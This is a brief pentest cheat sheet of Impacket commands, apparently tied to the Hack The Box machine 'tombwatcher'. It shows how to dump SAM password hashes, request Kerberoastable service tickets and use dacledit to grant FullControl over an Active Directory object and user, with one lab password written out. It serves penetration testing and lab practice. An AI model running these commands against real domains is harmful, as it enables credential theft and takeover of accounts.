# Impacket

% impacket, windows, smb, 445

## impacket-secretsdump - Dump password hashes from SAM
```
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
## impacket-GetUserSPN - Kerberoasting
```
# Kerberosting
GetUserSPNs.py <DOMAIN>/<USER>:<PASSWD> -outputfile kerberoasting.txt -dc-ip <DC IP>
```

## impacket-dacledit - gain full control over an object
```
# impacket-dacledit - gain full control over an object
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance - principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' TOMBWATCHER.HTB/john:'rogue'
```

## dacledit - Set GenericAll on john user using sam user
```
# dacledit - Set GenericAll on john user using sam user
dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'<SAM PASSWD>'
```